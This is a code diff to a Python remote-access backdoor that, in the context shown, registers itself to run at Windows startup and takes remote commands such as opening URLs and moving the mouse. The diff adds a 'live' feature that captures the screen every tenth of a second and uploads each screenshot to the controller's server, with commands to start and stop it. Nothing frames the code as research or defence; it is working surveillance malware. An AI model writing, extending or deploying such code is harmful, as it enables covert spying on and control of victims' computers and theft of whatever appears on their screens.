@@ -1,4 +1,4 @@
-import requests,time,os,keyboard,pyautogui,webbrowser,winreg,sys
+import requests,time,os,keyboard,pyautogui,webbrowser,winreg,sys,threading
 
 
 
@@ -15,6 +15,18 @@ def add_to_registry(key_name, script_path):
         print(f"Error adding to the Windows Registry: {e}")
 
 add_to_registry("startup", os.path.abspath(sys.argv[0]))
+
+def live(url, id):
+    while True:
+        try:
+            myScreenshot = pyautogui.screenshot()
+            myScreenshot.save('live.png')
+            sample_file = open("live.png", "rb")
+            upload_file = {"file": sample_file}
+            requests.post(f"{url}api/files/", files = upload_file)
+        except Exception as e:
+            print(e)
+        time.sleep(0.1)
 
 
 class backdoor:
@@ -196,6 +208,13 @@ class backdoor:
                     output += "opening " + url + " " + str(repition) + " times\n"
                 else:
                     output += "No argument provided\n"
+            elif command.startswith("live"):
+                self.t1 = threading.Thread(target=live, args=(self.url, self.id, ))
+                self.t1.start()
+                output += f"Started live watch at {url}/live/{self.id}\n"
+            elif command.startswith("stop_live"): 
+                self.t1.join()
+                output += "Stopped live\n"
             elif command.startswith("mouse"):
                 mouse_command = command.split(".")
                 if len(mouse_command) > 1:
